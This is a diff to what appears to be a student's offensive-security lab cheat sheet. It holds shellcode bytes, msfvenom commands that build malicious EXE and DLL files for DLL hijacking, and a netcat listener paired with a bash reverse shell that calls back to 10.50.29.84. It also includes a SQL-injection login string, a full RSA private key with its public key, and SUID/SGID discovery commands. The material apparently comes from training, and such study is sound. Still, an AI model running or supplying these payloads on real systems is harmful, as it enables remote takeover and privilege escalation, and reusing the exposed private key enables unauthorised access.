@@ -155,9 +155,47 @@ buf += "\x90" * 10
 buf += b"\xba\xd3\xd9\xf0\xd0\xd9\xc7\xd9\x74\x24\xf4\x5d"
 buf += b"\x31\xc9\xb1\x0c\x31\x55\x12\x83\xc5\x04\x03\x86"
 buf += b"\xd7\x12\x25\x42\xe3\x8a\x5f\xc0\x95\x42\x4d\x87"
-buf += b"\xd0\x74\xe5\x68\x90\x12\xf6\x1e\x79\x81\x9f\xb0"
+buf += b"\xd0\x74\xe5\x68\x90\x12\xf6\x1e\x79\x81\x9f\xb0"  
 buf += b"\x0c\xa6\x32\xa4\x06\x29\xb3\x34\x70\x4f\xd0\x5b"
 buf += b"\xec\xe9\x7f\xc4\xf0\xa2\x2c\x83\x10\x81\x53"
 print(buf)
+
+
+#WINDOWS
+  ##DLL SEARCH ORDER
+    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+    The directory the the Application was run from
+    The directory specified in in the C+ function GetSystemDirectory()
+    The directory specified in the C+ function GetWindowsDirectory()
+    The current directory
+
+
+
+msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\Users\student\Desktop\whoami.txt' -f exe > 7z.exe
+msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\Users\student\Desktop\whoamiPutty.txt' -f dll > SSPICLI.DLL
+
+nc -nlvp 15021
+#!/bin/bash
+ 
+echo "$(nc 10.50.29.84 15021 -e /bin/bash)"
+
+
+
+
+LOGIN INJECTION
+  USER/PASS: GySgt' or 1='1
+
+
+
+MIIEpQIBAAKCAQEA4D9rl2HG/luNAMXxsI7HxZQOo0df8y+9dW10AI7wLhL+S+rTVZHQ8jTXQ+ukPCcLIfA8yzw6njk5kK+xQzADubAg+8/kfpBKb6FcwbICly9tpdoqcRrQsSc4SNR09en2AdQWT6pmaScpQXcptyjdMmb4BTLOwdI2/UhZIf/iadTsc6IV/PF3No/g5NVEZGNMWTk7zoGGnxY2xSDWnrlTKm/mHhMo/Y8cTRaOvReLHpa37RZmn+QLqUolvj/BozkXgK1gcRIL3C6rIZfoE7n/Ne48W9rXq81vH/6lStPV7HqTDz2eXpX1KksytTd2uLE7tftBLBgCxowf4kl23gpnAwIDAQABAoIBAQCeX4wQDOkqSOQrkKDiDeS/AJLZ9BWqvaOzpEqR/mFYWOeqHD2HKIWGGZWSjYCfTv/Ix09YRcAscMPcEIlDp0xqPx78WNXKIQPBFRhaX+r+dWud/5eL6+FJzCYvIYU9DDBHGE9tki3jw9maN5uJlN2rtBckLL7jGiDl/sucfIieLoSSvqazEaNniVQu9kri6y8hWGFQyFCmIJBgDNbU94XRNfyMjMOMbNSzHdB16ndXixQ97mok8MMaZ46Jmm7Uh4xY/fSVSyWyRjr8e8aXyOt7GZhKSgVOqEpy9LlY+JLSsGKtZcW10F1IaHvf8GKlx6171xl1kS2M5gKU8N5q2TUhAoGBAP3tsL/ljXZJcvml9eA1cgpEpnFg5fdxw4fL8g4Vh5GSj/nnaNhvVg/rVq8vbwPJE01cPdpXxKe/OoGVpyAy9E12ryHPUwwf38RkK7QllU7XZApuloMkhEFj6aQQUK0gMP/rtw5KB75RpnDEZQjUcPu2GwcOFtCaHPu3pQ6BpLpRAoGBAOITvnRizDh+pQyWxfulsnFfYdf9OIZ2njHcIg0/ez9E2zHwcrpjpLw6RElZ0S9rZwsvPNLcNt0HtXhyVFfWoihpH7FR+YWhyxHYHcjdU46GenfnsKO0rjp/ruEx6u05AhRlvnRizDh+pQyWxfulsnFfYdf9OIZ2njHcIg0/ez9E2zHwcrpjpLw6RElZ0S9rZwsvPNLcNt0HtXhyVFfWoihpH7FR+YWhyxHYHcjdU46GenfnsKO0rjp/ruEx6u05AhRl9JQNxi/Z0q3zE8HxzM0QQsgG0L6FX86MOOaOf6MTAoGAbQHqzJZY4hyp1O4f3T5UVIAgC7ATSOR3kgZFRTKM3jtSv29OHQu+oFrg/ZeZSsC5Ho6opuDitThsf1ClTDdTlSWMDTGZby0HvKFb+ZvgutXQRoIu7uFwPToNBLdUSt306whfryysolEe6G4HCYFZd1U3yRGNTcO7CXxOySlyc+ECgYEA177bzBnUpj1FqQPhoEr6RXMu3n5KiRd91DstS9M+/JvrSncaJYGd3fsE27MZC9XFGklUFC4PNVN7/Juunby4NzRLCF8gbkR+lGLX2a5NZQA0s2SpjzCH7E+ZRlLqzMPQlkLN6tRSQ6vtgA8u1bC5LyDLejP21TpWubfbPTrT130CgYEAmPSziwbA1SQjgmVIjkkKH+/pR6KFfV4q1apukhGz29M+b35UpPySVBLPYSS+BgJHlBdt9JVaIh/x0js4rWjo25XS/LbJ4lUCHdkAuSaGzTSaAM3wfPaVvmY0+I0N+fupndvL2bUWHR2Ftle+ZMHFSHgn2jLvkOfjful9XKjs2Ys=
+
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgP2uXYcb+W40AxfGwjsfFlA6jR1/zL711bXQAjvAuEv5L6tNVkdDyNNdD66Q8Jwsh8DzLPDqeOTmQr7FDMAO5sCD7z+R+kEpvoVzBsgKXL22l2ipxGtCxJzhI1HT16fYB1BZPqmZpJylBdym3KN0yZvgFMs7B0jb9SFkh/+Jp1OxzohX88Xc2j+Dk1URkY0xZOTvOgYafFjbFINaeuVMqb+YeEyj9jxxNFo69F4selrftFmaf5AupSiW+P8GjOReArWBxEgvcLqshl+gTuf817jxb2terzW8f/qVK09XsepMPPZ5elfUqSzK1N3a4sTu1+0EsGALGjB/iSXbeCmcD comrade@extranet.site.donovia
+
+
+
+find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files
+find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files
+find / -type f -perm /6000 -ls 2>/dev/null # Find SUID and/or SGID files
 
 
